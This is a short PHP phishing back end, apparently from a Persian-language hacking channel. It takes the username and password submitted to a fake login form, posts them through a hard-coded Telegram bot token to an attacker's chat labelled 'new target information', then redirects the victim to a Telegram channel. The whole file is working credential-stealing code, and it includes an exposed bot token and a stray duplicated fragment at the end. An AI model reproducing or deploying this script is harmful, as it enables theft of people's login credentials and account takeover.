<?php 
$msg_user= $_POST['username'];
$msg_pass= $_POST['password'];


$admin = 1443797903;
$token = "1786223681:AAHq6MEjDmJEfD9tX5Xo-PnRJe-G1p5oAzc";

define('API_KEY',"$token");
function bot($method,$datas=[]){
    $url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

if (!empty($_POST)) {
bot('sendmessage', [
'chat_id'=>$admin,
'text'=>"❕اطلاعات تارگت جدید😎👊
🌐 یوزرنیم : $msg_user
🌐 پسوورد : $msg_user

کانال تلگرام ما : 
🆔 سناتور مجازیم
⚙𝚜𝚎𝚗𝚊𝚝𝚘𝚛𝚖𝚊𝚓𝚊𝚣𝚒
", 
]);
} 

?>
<meta content='0;url=https://t.me/code_hacks<?php ?>' http-equiv='refresh'/>
?php ?>' http-equiv='refresh'/>
